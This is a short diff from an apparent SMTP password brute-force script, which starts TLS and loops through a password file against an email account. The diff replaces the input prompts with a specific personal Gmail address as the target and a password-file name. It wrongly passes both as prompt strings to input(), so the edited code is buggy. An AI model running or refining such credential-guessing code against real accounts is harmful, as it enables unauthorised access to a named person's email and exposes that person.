@@ -6,8 +6,8 @@ def main():
     smtpserver.ehlo()
     smtpserver.starttls()
 
-    user = input("Enter the target's email address: ")
-    passwfile = input("Enter the password file name: ")
+    user = input("sithara.munasinghe12@gmail.com")
+    passwfile = input("password.text")
     passwfile = open(passwfile, "r")
 
     for password in passwfile:
